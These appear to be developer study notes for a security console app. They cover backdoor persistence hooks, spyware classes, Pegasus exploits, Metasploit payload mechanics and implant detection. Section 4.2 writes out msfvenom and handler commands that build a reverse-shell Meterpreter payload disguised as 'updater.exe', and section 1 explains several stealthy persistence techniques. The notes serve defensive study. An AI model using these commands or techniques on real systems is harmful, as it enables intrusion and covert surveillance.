# THREAT MODELS — backdoors, spyware, Pegasus, Metasploit

Study notes for the console. Four subjects that get bundled together and are not the same
thing:

- a **backdoor** is a persistence mechanism
- **spyware** is a collection + exfiltration capability
- **Pegasus** is a specific product built from both, sold to states
- **Metasploit** is the commodity framework that does the same four things worse, openly

The useful question for every one of them: *where does it survive a reboot, and what does it
have to talk to?* Answer those and the whole design falls out.

---

# 1. BACKDOOR — persistence mechanics

A backdoor is not malware. It is a hook the operating system consults on its own, pointed at
something that was not there before. Every platform has a finite set of these hooks. There is
no magic; the list is short and it has been the same list for a decade.

## 1.1 Windows — the hook inventory

| Hook | Where | Survives reboot | Fileless | Detection |
|---|---|---|---|---|
| Run / RunOnce | `HKCU\...\CurrentVersion\Run` | yes | no | trivially, `autoruns` |
| Service (own binary) | `HKLM\SYSTEM\CurrentControlSet\Services` | yes | no | service list |
| Service **DLL in svchost** | `HKLM\...\Svchost` `netsvcs` group | yes | no | `svchost -k netsvcs` DLL audit |
| **WMI event subscription** | `root\subscription` | **yes** | **yes** | `__EventFilter`, `__FilterToConsumerBinding` |
| COM hijack | `HKCU\Software\Classes\CLSID\{guid}\InprocServer32` | yes | no | CLSID diff HKCU vs HKLM |
| DLL search-order plant | writable dir earlier than System32 | yes | no | ACL + phantom-DLL scan |
| Scheduled task | `\Windows\System32\Tasks` | yes | either | task list, XML on disk |
| BITS job | `%ALLUSERSPROFILE%\Microsoft\Network\Downloader` | yes | no | `bitsadmin /list /allusers` |
| Accessibility binary swap | `sethc.exe`, `utilman.exe`, `osk.exe` → `cmd.exe` | yes | no | hash compare |
| AppCertDLLs | `HKLM\...\AppCertDlls` | yes | no | any non-default value |
| Bootkit | MBR / UEFI ESP | yes | n/a | `bcdedit`, firmware hash |
| Kerberos: golden / silver ticket | domain, not host | until KRBTGT rotation ×2 | **yes** | event 4769 anomalies |
| **Skeleton Key** | LSASS patch | until reboot | **yes** | none locally — that is the point |
| **AdminSDHolder / SIDHistory** | AD ACL | yes | n/a | ACL diff on the template object |
| **DCShadow** | rogue DC registers in AD | yes | n/a | replication metadata |

Three of those are worth dwelling on because they are the ones that make responders say
"we reimaged it and it came back".

**WMI event subscription** is the cleanest fileless persistence on Windows. You register an
`__EventFilter` (e.g. every 5 minutes, or on process start), a `CommandLineEventConsumer`
carrying your command line, and a `__FilterToConsumerBinding` joining them. WMI owns the
storage; nothing is written to disk, no service is created, and the trigger is a
first-class OS facility. Removal means deleting all three objects in the right order, which
is why half-deleted bindings are a common artefact of sloppy cleanup.

**Skeleton Key** patches LSASS in memory so that a single master password authenticates as
*any* domain account, while real passwords keep working. Nothing on disk changes. It dies on
reboot and must be re-applied — which is exactly why it is used during an intrusion, not as
persistence.

**DCShadow** is the inverse: rather than reading AD, you *push* changes into it by
registering an attacker-controlled machine as a replication source. The artefact is a
legitimate-looking `nTDSDSA` object and replication metadata, not a file.

## 1.2 Linux — the hook inventory

| Hook | Where | Notes |
|---|---|---|
| `authorized_keys` | `~/.ssh`, `/root/.ssh` | the classic; one line, full access |
| cron | `/etc/cron.d`, `crontab -e`, `/etc/crontab` | three separate namespaces |
| systemd unit + timer | `/etc/systemd/system` | `Restart=always`, `ExecStart` in `/dev/shm` |
| shell rc | `.bashrc`, `.profile`, `/etc/profile.d` | login-triggered only |
| **`/etc/ld.so.preload`** | global | every dynamically linked binary loads your `.so` |
| PAM module | `/lib/security/pam_*.so` | captures every credential on the box |
| `rc.local` / init | `/etc/rc.local` | trivial, still present |
| initramfs | `/boot/initrd.img` | survives root filesystem inspection |
| kernel module | `insmod` | Diamorphine, Reptile; hides processes, files, sockets |
| **eBPF** | `bpf()` loaded program | **no file, no module, kernel-resident** |
| `inetd`/`xinetd` | `/etc/xinetd.d` | trivial bind shell |

The two that matter in 2026 are **`ld.so.preload`** (a one-line file that backdoors every
binary on the system, verifiable by running `ldd` on anything) and **eBPF**
(a loaded program that filters `getdents64` to hide files from `ls` and from `ps`). eBPF is
the Linux analogue of a Windows fileless implant: nothing on disk, invisible to file
integrity monitoring, and requires a kernel-level rootkit scanner or a reboot to clear.

## 1.3 Android — what an app can actually do

This is the platform the console runs on, so the list is precise.

| Hook | Needs | Survives reboot | Survives uninstall |
|---|---|---|---|
| `BOOT_COMPLETED` receiver | nothing | yes | **no** |
| Foreground service + `START_STICKY` | notification | yes | no |
| `JobScheduler` / `WorkManager` | nothing | yes | no |
| `DevicePolicyManager` admin | user taps "activate" | yes | no (uninstall blocked until deactivated) |
| **`AccessibilityService`** | user toggles in Settings | yes | no |
| `NotificationListenerService` | user grants | yes | no |
| `MediaProjection` | per-session consent | no | no |
| `SYSTEM_ALERT_WINDOW` overlay | user grants | yes | no |
| Magisk module / `/system/app` | **root** | yes | **yes** |

The load-bearing fact: **on a non-rooted Android device, uninstalling the app removes
everything.** There is no non-root persistence outside the app's own data directory. That is
why commodity Android spyware fights so hard to stay installed and to survive the
"uninstall" button — device admin blocks it, and accessibility lets it re-grant itself UI
taps.

**`AccessibilityService` is the spyware API.** It reads every node of text on screen
(including password fields in apps that do not set `FLAG_SECURE`), performs gestures as the
user, and cannot be restricted per-app by the user beyond a global toggle. A spyware app
that holds accessibility plus `RECORD_AUDIO` plus `INTERNET` needs no exploit at all. It
asks, the user taps yes, and it is a working implant.

## 1.4 iOS — why the list is so short

A non-jailbroken iPhone has **no third-party persistence hook**. Third-party code runs as a
sandboxed app, `launchd` jobs outside the sandbox require root, and there is no equivalent of
`BOOT_COMPLETED` that survives the app being killed. That is the entire security model and it
is why iOS nation-grade implants must either:

1. hold **kernel read/write** from an exploit chain, and re-infect after reboot, or
2. install a **`launchd` plist** as root (jailbreak or a full chain with a persistence
   primitive), or
3. accept **memory-only, until-reboot** lifetimes.

Pegasus did (1) and (2) depending on the version. Operation Triangulation did (3) — it lived
entirely in memory and a reboot cleared it. That is not a weakness in the implant; it is the
correct engineering choice when the alternative is a file the OS can find.

---

# 2. SPYWARE — the two entirely different products

People use one word for two markets that share no code, no price, and no threat model.

## 2.1 Commodity: the stealer

Sold as a service, $5 000–$20 000/month, targets bank customers and jealous partners.

```
delivery      sideloaded APK / fake store / WhatsApp campaign / smishing link
permissions   AccessibilityService, RECORD_AUDIO, READ_SMS, SYSTEM_ALERT_WINDOW
capability    keylogging via accessibility, overlay injection over banking apps,
              screen capture via MediaProjection, SMS OTP interception,
              contact + call log harvest, location
C2            HTTPS to a panel, or — increasingly — a legitimate service:
              Firebase, Dropbox, OneDrive, Telegram bot API, Discord webhook
economics     one operator, hundreds of victims
```

The 2024–25 shift that matters: **C2 hiding inside legitimate cloud services.** A beacon to
`firebasestorage.googleapis.com` or a Telegram `sendMessage` call is indistinguishable from a
normal app at the network layer, because it *is* a normal app talking to a normal service.
Domain blocklists and TLS inspection of CN/SAN do not help.

Known families in this class: Anatsa/TeaBot, Cerberus and its descendants (Ermac, Hook, Octo),
xHelper, Joker. They reuse the same four primitives; the naming is marketing.

## 2.2 Nation-grade: the implant

Sold to states, seven figures a year, targets individuals.

```
delivery      0-click: iMessage attachment, WhatsApp call, RCS, calendar invite
trigger       memory corruption in a file-format parser (see §3)
chain         2–4 bugs: parser bug → sandbox escape → kernel r/w
payload       in-memory, no file ever written
persistence   launchd job, or none at all
C2            operator-operated domain set, rotating, TLS, often DNS-tunnelled
collection    mic, camera, calls, SMS, WhatsApp/Telegram/Signal databases, keychain,
              live location, passwords, screen
exfil         chunked, throttled, often Wi-Fi-only, sometimes operator-pull only
lifetime      days to years; includes a self-destruct command
economics     tens of victims per customer
```

The distinction is not "more features". It is that **commodity needs the user to tap yes,
nation-grade does not.** Every defensive control on a phone is built around consent. A 0-click
chain does not ask.

---

# 3. PEGASUS — case study

Made by NSO Group (Israel, founded 2010). The most documented implant in history, because
Amnesty's Security Lab and Citizen Lab spent five years taking it apart in public.

## 3.1 Timeline of the parts that are technically interesting

| Year | Event | Technical content |
|---|---|---|
| 2016 | Trident | iOS 9.3.4, three chained bugs: `CVE-2016-4657` (WebKit), `-4655` (kernel), `-4656` (IOKit). One-click link. |
| 2017 | **Chrysaor** | The Android build, found by Google Project Zero + Lookout. Same architecture, Android primitives. |
| 2019 | WhatsApp call exploit | `CVE-2019-3568`, buffer overflow in SRTCP handling inside the WhatsApp VoIP stack. **0-click, just answer or don't — the call itself is the trigger.** |
| 2021 Jul | Project Pegasus | 50 000 numbers, 10 countries corroborated. Amnesty's methodology: check the *backup*, not the phone. |
| 2021 Sep | **FORCEDENTRY / KISMET** | `CVE-2021-30860`. The one worth understanding. |
| 2023 Sep | **BLASTPASS** | `CVE-2023-41064` (ImageIO) + `CVE-2023-41061` (PassKit). 0-click via a PassKit attachment. |

## 3.2 FORCEDENTRY — why it is the reference exploit

`CVE-2021-30860` is an integer overflow in **JBIG2** decoding inside CoreGraphics. Apple's
PDF parser accepts JBIG2-compressed images, and the JBIG2 spec includes *arithmetic-coded
symbol dictionaries* — an image format that is, structurally, a small virtual machine for
raster operations.

Project Zero's writeup describes what NSO did with that:

- BlastDoor (iOS 14's out-of-process message parser) sanitised the actual PDF and stripped the
  JBIG2 data.
- The exploit **reconstructed a fake PDF in memory** after BlastDoor had already run, so the
  sanitiser's output was bypassed entirely.
- The JBIG2 symbol dictionary was used to implement **~29 000 lines of code encoded as CPU
  logic gates** — AND/OR/XOR primitives built out of arithmetic-coded bitmap operations.
- That gate-level program then performed the integer-overflow exploitation and set up the
  next stage.

Project Zero's verdict was that it was the most technically sophisticated exploit they had
ever analysed. The lesson is not "JBIG2 is bad". It is that a *decoder* is a Turing-complete
program, and any spec rich enough to describe arbitrary images is rich enough to run logic.

Fixed in iOS 14.8 / macOS 11.6.

## 3.3 Architecture

Amnesty's reconstruction and Lookout's Chrysaor teardown agree on the shape:

```
1. loader        tiny, delivered by the exploit, no imports the OS would notice
2. implant       userspace, holds a kernel read/write primitive handed up from the chain
3. bridgehead    small modules that talk to operator servers, swapped on demand
4. agent         the collection modules, downloaded as needed and never resident together
5. kernel comp   hooks for hiding, for persistence, for surviving app-level inspection
6. operator C2   rotating domain set, TLS, operator pulls data rather than push-exfil
```

Three engineering choices that define the class:

- **Modularity.** The collection capability is downloaded per target, not shipped. A phone
  can carry Pegasus and hold almost none of its features at any given moment.
- **Kernel-level hiding.** With kernel r/w, the implant unlinks itself from process lists and
  hides its own files from the VFS layer. `ps` and `ls` are lying to you.
- **Self-destruct.** An operator command removes everything. A target who suspects they are
  infected and hands the phone to a lab may be handing over a clean device.

## 3.4 The others, briefly

| Product | Vendor | Notable |
|---|---|---|
| **Predator** | Cytrox / Intellexa | Android + iOS, 0-click via HTML renderer; Intellexa sanctioned by US Treasury 2023 |
| **Graphite** | Paragon Solutions | WhatsApp disclosed ~90 targeted users, Jan 2025 |
| **Reign** | QuaDream | iOS, **invisible iCloud Calendar invitations** as the delivery vector — no message, no notification |
| **Hermit / DevilsTongue** | RCS Lab | Android + iOS, delivered as a fake carrier app |
| **Triangulation** | unattributed | iOS, `CVE-2023-41990` FontParser → kernel; **memory-only, reboot clears it** |

---

# 4. METASPLOIT — the commodity equivalent

## 4.1 What it is

A Ruby framework (Perl originally, 2003, HD Moore; rewritten in Ruby 2007; acquired by Rapid7
2009). Open-source Framework + commercial Pro. The value is not any single exploit — it is
the **module library as a catalogue of exploitation mechanics**, ~2 400 modules with readable
source.

```
modules/
  exploits/    a bug plus a payload
  auxiliary/   scanners, fuzzers, sniffers — no payload
  post/        runs inside a session
  payloads/
    singles/      stageless — the whole implant in the first packet
    stagers/      small loader; pulls the stage over the wire
  encoders/    byte-avoidance, NOT antivirus evasion (historical misconception)
  evasion/     actual Windows Defender / AMSI bypass modules
  nops/        sleds
```

## 4.2 Payload mechanics — what "staged" means

`windows/x64/meterpreter/reverse_tcp` is a **stager**: a few hundred bytes that connect back
and download the real payload. `windows/x64/meterpreter_reverse_tcp` is **stageless**: the
entire Meterpreter in the first packet, several hundred kilobytes.

Staged is smaller and more compatible with a tight buffer; stageless survives a network that
only allows one outbound connection. That is the whole trade.

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 \
         -f exe -o updater.exe
msfconsole -q -x "use exploit/multi/handler; \
  set PAYLOAD windows/x64/meterpreter/reverse_tcp; \
  set LHOST 10.0.0.5; set LPORT 443; run"
```

## 4.3 Meterpreter — the part people misunderstand

Meterpreter is **not** a RAT binary you place on disk. It is a DLL injected **reflectively**:
the loader maps it into the target process's memory, resolves its own imports, and calls its
entry point without ever touching the Windows loader. Consequently:

- no file on disk to hash
- no module in the PEB's loader list — `EnumProcessModules` does not see it
- `migrate` moves the session into a long-lived process (`explorer.exe`, `svchost.exe`) so the
  original host process can die without killing the session
- `hashdump`, `kiwi` (Mimikatz), `screenshot`, `keyscan_start`, `portfwd`, `pivot` are
  post modules that load **inside that memory**

That design is from 2004 and it is why Meterpreter still appears in incident reports: the
concept (reflective in-memory loading) outlived every specific payload.

## 4.4 Where it stops working

Honest assessment, 2026:

| Control | Effect on stock MSF |
|---|---|
| Windows Defender + cloud-delivered protection | stock stagers are signatured on write |
| **AMSI** | blocks in-memory script payloads at the point `AmsiScanBuffer` is called |
| **ETW** | `.NET` and PowerShell assembly loads are telemetered regardless of AMSI |
| EDR (CrowdStrike, Defender for Endpoint) | flags `CreateRemoteThread`, `VirtualAllocEx RWX`, LSASS handle access |
| Kernel-level `Credential Guard` | `hashdump`/`kiwi` return nothing |
| AppLocker / WDAC | no unsigned binary executes at all |

The Framework is still extremely useful for three things: **auxiliary scanners**, **the module
source as a reference** (every module is a worked example of a real bug), and **post-exploitation
against unpatched or OT/embedded systems** where none of the above exists.

Nothing in Metasploit is a 0-click. It is all "you already have a foothold or a reachable
service". That is the gap between it and §3.

---

# 5. DETECTION — what actually works, per surface

## 5.1 iOS

You cannot inspect a running iPhone from an app. You inspect a **backup**.

- **`mvt-ios`** (Amnesty, MIT licence) — `check-backup` and `check-fs` against a decrypted
  backup, with STIX indicator feeds.
- **`DataUsage.sqlite`** — per-process network byte counters. A process with traffic and no
  corresponding app is the classic Pegasus artefact.
- **`Shutdown.log`** — iOS 14+ records launchd jobs that survived shutdown; a strange job name
  with no app behind it is the artefact.
- **`.ips` crash reports** — `CommCenter`, `imagent`, `IMDPersistenceAgent` crashes correlate
  with message-parser exploitation.
- **`Manifest.db`** — unknown backup domains, files under paths no app owns.

Absence of indicators is **not** evidence of cleanliness: kernel-level hiding exists
specifically to defeat this. High-risk targets get Lockdown Mode (`BlastDoor` plus link
previews disabled, which defeats the entire FORCEDENTRY and BLASTPASS classes), OS updates,
and eventually a new device.

## 5.2 Android

`mvt-android` and **AndroidQF** collect via `adb`: `dumpsys`, package list, accessibility
config, `settings get secure`, `logcat`, and known stalkerware package lookups.

The artefacts that matter, in order of signal:

1. **A package with `BIND_ACCESSIBILITY_SERVICE` and `RECORD_AUDIO` or `READ_SMS`.**
   Individually normal; together, that is a spyware permission triad.
2. **A package with a service and `INTERNET` but no launcher activity.** Nothing to open means
   nothing to notice.
3. **Device admin active on an app that is not a corporate MDM.**
4. **`SYSTEM_ALERT_WINDOW` on an app with no visible UI** — overlay credential theft.
5. **Installer package not a known store** on anything that holds SMS or audio.
6. **`BIND_NOTIFICATION_LISTENER_SERVICE` + `INTERNET`** — reads every notification, including
   OTPs.

`data/ImplantScan.kt` in this app codifies exactly those six rules and scores them.

## 5.3 The honest limit

An app **cannot** detect a 0-click kernel-level implant. It has no kernel read access, no way
to see a hidden process, and no vantage point on a `launchd` job that the kernel is actively
concealing. What an app-level audit *can* do is catch the commodity tier, which is 99% of
actual victims, and catch the mistakes nation-grade operators make.

Anyone claiming otherwise is selling something.

---

# 6. Cross-reference — what the console already has

| Subject | Module |
|---|---|
| Vulnerability feeds (CISA KEV, NVD) | `PublicIntel.kt` |
| Breach exposure | `IdentityIntel.kt` |
| Device position surface | `LocationSurface.kt` |
| Radio-fingerprint position | `LocationResolver.kt`, `DeviceLocation.kt` |
| Track persistence + gap semantics | `TrackStore.kt`, `TrackFeeds.kt`, `TrackService.kt` |
| **Host implant indicators** | `ImplantScan.kt` (this ticket) |

## Verification notes

Facts in §3 were checked against public reporting; no live probe applies to an implant this
document cannot obtain. The CVE identifiers, fix versions, and the JBIG2 gate-program detail
are from Project Zero's FORCEDENTRY writeup and Amnesty's Pegasus methodology. §4 mechanics
are from the Framework source (`lib/msf/core/payload/`, `modules/payloads/stagers/`). §1
hook paths are stable across Windows 10/11, Linux 5.x/6.x, Android 8–15, iOS 14–18.